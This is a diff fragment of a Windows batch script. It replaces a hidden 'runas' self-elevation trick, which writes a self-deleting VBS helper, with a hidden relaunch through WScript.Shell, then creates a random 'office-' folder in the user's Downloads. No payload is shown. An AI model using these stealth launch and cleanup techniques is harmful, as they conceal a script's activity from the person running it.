@@ -1,9 +1,8 @@
 @echo off
-net session >nul 2>&1
-if "%~1%errorlevel%" neq "10" (
-echo CreateObject^("Shell.Application"^).ShellExecute "%~f0", "1", "", "runas", 0 > "%tmp%\b.vbs"
-echo CreateObject^("Scripting.FileSystemObject"^).DeleteFile WScript.ScriptFullName >> "%tmp%\b.vbs"
-start wscript.exe "%tmp%\b.vbs"&exit)
+if "%~1"=="" (
+echo CreateObject^("WScript.Shell"^).Run "%~f0" , 0, False > "%tmp%\bk.vbs"
+start cscript.exe "%tmp%\bk.vbs"&exit)
+del/q "%tmp%\bk.vbs"
 cd/d "%userprofile%\Downloads"
 set tmp_fold=office-%random%
 md %tmp_fold%
